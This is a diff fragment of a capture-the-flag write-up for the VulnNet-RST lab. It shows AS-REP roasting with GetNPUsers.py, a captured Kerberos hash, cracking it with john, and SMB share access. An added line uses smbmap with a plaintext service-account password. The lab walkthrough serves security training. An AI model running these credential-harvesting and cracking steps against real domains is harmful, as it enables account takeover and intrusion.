@@ -56,10 +56,12 @@ python3 GetNPUsers.py vulnnet-rst.local/ -no-pass -userfile usernames.txt
 $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:692e76f70a8772c46ed94e73130460c8$713b0693498fdaff68642d78e713ca965e5007d5d864ca727289930783fe28f00bf79fef8126c4722d09cafc72ec60e940d31297591f67ce049030cb531ddd9c83cd37796fbf414b830a7c90fe26d2c45d6f2b624cd4413c58e3dbb77519dd69906248f8db27b1974b880a826003e562e25d9de9e4cb7cfa85c1de954761053b7d51a455530001348b46909f91f4e80bae7374071339f0920bb3e2ad95169d20f05d0cd586882facb63c058072dacb7ec8ddbcd9297331e1f6fb6d844ea7967659bee38fde4431af9f9608e9adcb38cb6e20e72bcf61c524f480b5ea2530e16dbeed2272855a61a05c03e84653aa1a3bbbd5ece06633
 ````
 - Crack the hash with `john`
-### Samba authenticated access
+### SMB Samba authenticated access
 ````
 smbclient -U vulnnet-rst.local/t-skid //10.10.100.15/NETLOGON
+smbmap -u svc-admin -p management2005 -H 10.10.248.93
 ````
+
 - Cat out files with `smb`
 ````
 Enter VULNNET-RST.LOCAL\t-skid's password: 
